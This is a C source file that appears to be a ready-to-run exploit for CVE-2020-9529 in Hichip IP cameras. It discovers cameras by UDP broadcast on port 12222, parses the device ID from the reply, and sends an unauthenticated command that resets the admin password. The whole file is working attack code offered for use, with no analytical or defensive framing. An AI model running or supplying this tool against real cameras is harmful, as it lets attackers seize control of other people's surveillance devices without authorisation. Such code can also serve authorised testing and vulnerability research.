#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 12222
#define BUFFER_SIZE 1024

void send_udp_message(const char *message, const char *ip, char *response) {
    int sock;
    struct sockaddr_in server_addr;
    socklen_t addr_len = sizeof(server_addr);
    char buffer[BUFFER_SIZE] = {0};

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    int broadcast_enable = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    printf("[*] Sending UDP message to %s:%d\n", ip, PORT);
    printf("[*] Message:\n\n%s\n", message);

    if (sendto(sock, message, strlen(message), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("sendto failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // receive response
    struct timeval timeout = {3, 0}; // x-second timeout
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    ssize_t recv_len = recvfrom(sock, buffer, BUFFER_SIZE - 1, 0, (struct sockaddr *)&server_addr, &addr_len);
    if (recv_len < 0) {
        printf("[*] No response received.\n");
    } else {
        buffer[recv_len] = '\0'; // null-terminate response
        strcpy(response, buffer);
    }

    close(sock);
}

int main() {
    char dev_ip[32] = "255.255.255.255"; // default broadcast ip, gateway
    char response[BUFFER_SIZE] = {0};
    char dev_id[64] = {0};

    printf("  ______     _______                                \n");
    printf(" / ___\\ \\   / / ____|                               \n");
    printf("| |    \\ \\ / /|  _|                                 \n");
    printf("| |___  \\ V / | |___                                \n");
    printf(" \\____| _\\_/__|_____|_        ___  ____ ____   ___  \n");
    printf("|___ \\ / _ \\___ \\ / _ \\      / _ \\| ___|___ \\ / _ \\ \n");
    printf("  __) | | | |__) | | | |____| (_) |___ \\ __) | (_) |\n");
    printf(" / __/| |_| / __/| |_| |_____\\__, |___) / __/ \\__, |\n");
    printf("|_____|\\___/_____|\\___/        /_/|____/_____|  /_/ \n\n");
    printf("[*] Hichip IP Camera Admin Reset (CVE-2020-9529)\n");
    printf("[*] Copyright (c) 2025, nullcel.com\n");
    printf("[*] Under BSD 3-Clause License\n");
    printf("Enter device IP (or press enter for autodiscovery): ");
    fgets(dev_ip, sizeof(dev_ip), stdin);
    
    dev_ip[strcspn(dev_ip, "\n")] = 0;
    if (strlen(dev_ip) == 0) {
        strcpy(dev_ip, "255.255.255.255");
    }

    printf("[*] Searching for device...\n");

    // send discovery request
    send_udp_message("    SEARCH * HDS/1.0\r\n    CSeq:1\r\n    Client-ID:bogus\r\n\r\n", dev_ip, response);

    // parese device id and ip
    char *dev_id_ptr = strstr(response, "Device-ID=");
    char *dev_ip_ptr = strstr(response, "IP=");

    if (!dev_id_ptr || !dev_ip_ptr) {
        printf("[*] No device found.\n");
        return 1;
    }

    sscanf(dev_id_ptr, "Device-ID=%s", dev_id);
    sscanf(dev_ip_ptr, "IP=%s", dev_ip);

    printf("[*] Found device at %s (ID: %s)\n", dev_ip, dev_id);
    printf("[*] Resetting admin password...\n");

    // build reset
    char reset_cmd[BUFFER_SIZE];
    snprintf(reset_cmd, sizeof(reset_cmd),
             "    CMD * HDS/1.0\r\n    CSeq:1\r\n    Client-ID:bogus\r\n    Device-ID:%s\r\n    Content-Length:23\r\n\r\nusrpwd set -resetpwd on",
             dev_id);

    // sned reset
    send_udp_message(reset_cmd, dev_ip, response);

    if (strlen(response) == 0) {
        printf("[*] No response received, device may not be vulnerable.\n");
        return 1;
    }

    printf("[*] Response received:\n%s\n", response);

    return 0;
}
